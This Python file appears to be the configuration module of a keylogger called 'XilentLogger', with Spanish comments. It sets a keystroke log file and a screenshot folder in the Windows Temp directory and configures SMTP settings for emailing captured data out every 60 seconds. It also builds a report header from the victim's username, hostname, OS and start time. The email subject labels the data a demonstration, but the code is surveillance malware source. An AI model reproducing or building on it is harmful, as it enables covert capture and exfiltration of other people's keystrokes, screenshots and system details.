from pathlib import Path
import os
import platform
from datetime import datetime

SEND_INTERVAL = 60

# Configuración SMTP
SMTP_CONFIG = {
    'host': "sandbox.smtp.mailtrap.io",
    'port': 587,
    'username': "",
    'password': "",
    'from_email': "xilentlogger@message",
    'to_email': "R3LI4NT",
    'screenshot_interval': SEND_INTERVAL,
    'max_screenshots': 3,
    'subject': "XilentLogger - Datos de Demostración"
}

# Configuración de rutas
LOG_PATH = Path("C:\\Windows\\Temp\\keylogs.txt")
SCREENSHOT_DIR = Path("C:\\Windows\\Temp\\XilentScreenshots")

# Obtener información del sistema
def get_system_info():
    return {
        'username': os.getlogin(),
        'os': f"{platform.system()} {platform.release()}",
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'hostname': platform.node()
    }

system_info = get_system_info()
LOGGER_HEADER = f"""
=== XILENTLOGGER ===
        
[!] INFORMACIÓN DEL SISTEMA [!]
• Tool: XilentLogger v1.0
• Usuario: {system_info['username']}
• Hostname: {system_info['hostname']}
• OS: {system_info['os']}
• Hora Inicio: {system_info['time']}
"""